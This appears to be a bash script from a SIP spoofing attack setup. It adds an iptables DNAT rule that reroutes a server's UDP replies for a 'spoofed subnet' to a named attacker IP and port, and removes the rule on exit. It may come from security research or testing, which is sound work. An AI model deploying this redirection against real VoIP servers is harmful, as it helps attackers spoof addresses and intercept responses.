#!/bin/bash
# Setup script for return path configuration
# This script configures DNAT rules for return traffic routing

set -e

# Default configuration
SIP_PORT="${SIP_PORT:-5060}"
SPOOFED_SUBNET="${SPOOFED_SUBNET:-10.10.123.0/25}"
ATTACKER_IP="${ATTACKER_IP:-143.53.142.93}"
ACK_PORT="${ACK_PORT:-4000}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

cleanup() {
    log_info "Cleaning up return path DNAT rule..."
    iptables -t nat -D OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT" 2>/dev/null || true
}

# Trap cleanup on exit
trap cleanup EXIT INT TERM

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    log_error "This script must be run as root (use sudo)"
    exit 1
fi

log_info "Setting up return path configuration..."
log_info "SIP port: $SIP_PORT"
log_info "Spoofed subnet: $SPOOFED_SUBNET"
log_info "Attacker IP: $ATTACKER_IP"
log_info "ACK port: $ACK_PORT"

# Remove existing rule if present
iptables -t nat -D OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT" 2>/dev/null || true

# Add DNAT rule for return path
log_info "Adding DNAT rule for return path..."
iptables -t nat -I OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT"

if [ $? -eq 0 ]; then
    log_info "✓ Return path DNAT rule added successfully"
else
    log_error "Failed to add return path DNAT rule"
    exit 1
fi

log_info "Return path setup complete."
log_info "Rule will remain active until this script exits or is terminated."

# Keep the script running to maintain the rule
echo "Press Ctrl+C to stop and cleanup..."
while true; do 
    sleep 1
done
